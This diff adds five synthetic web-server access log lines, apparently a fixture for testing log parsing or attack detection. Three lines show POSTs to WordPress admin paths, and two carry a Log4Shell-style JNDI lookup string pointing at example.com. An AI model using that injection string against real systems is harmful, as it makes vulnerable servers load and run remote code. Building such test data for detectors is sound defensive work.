@@ -1,0 +1,5 @@
+77.72.0.74 - - [20/May/2019:11:02:41 +0100] "POST wp-test HTTP/1.0" 200 2319 "-" "Installatron Plugin/9.1.44"
+77.72.0.75 - - [20/May/2019:11:02:41 +0100] "POST wp-admin HTTP/1.0" 200 2319 "-" "Installatron Plugin/9.1.44"
+77.72.0.76 - - [20/May/2019:11:02:41 +0100] "POST wp-admin/login HTTP/1.0" 200 2319 "-" "Installatron Plugin/9.1.44"
+87.72.0.76 - - [20/May/2019:11:02:41 +0100] "POST ${jndi:ldap://example.com/a} HTTP/1.0" 200 2319 "-" "Installatron Plugin/9.1.44"
+87.72.0.76 - - [20/May/2019:11:02:41 +0100] "POST ${jndi:ldap://example.com/a} HTTP/1.0" 200 2319 "-" "petersweb bot"
